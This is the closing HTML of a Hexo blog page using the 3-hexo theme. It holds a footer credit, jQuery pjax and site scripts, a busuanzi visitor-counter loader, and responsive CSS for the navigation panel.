<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    

    
</style>







</html>
